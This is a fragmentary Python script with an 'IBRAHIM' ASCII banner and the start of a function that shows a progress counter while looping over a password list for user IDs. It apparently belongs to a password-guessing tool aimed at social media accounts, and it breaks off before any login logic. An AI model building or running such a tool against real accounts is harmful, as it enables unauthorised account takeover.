...
[white]d888888b d8888b. d8888b.  .d8b.  db   db d888888b .88b  d88. 
  `88'   88  `8D 88  `8D d8' `8b 88   88   `88'   88'YbdP`88 
   88    88oooY' 88oobY' 88ooo88 88ooo88    88    88  88  88 
   88    88~~~b. 88`8b   88~~~88 88~~~88    88    88  88  88 
  .88.   88   8D 88 `88. 88   88 88   88   .88.   88  88  88 
Y888888P Y8888P' 88   YD YP   YP YP   YP Y888888P YP  YP  YP 
...
def need(uid,pwx,fb,tl):
    ...
    sys.stdout.write(f"\r  \33[1;90m[\33[1;97mIBRAHIM ✘D\33[1;92m | {'{:.1%}'.format(loop/int(tl))} | \33[1;97m{loop} \33[1;90m] \r "),
    sys.stdout.flush()
    try:
        for ps in pwx:
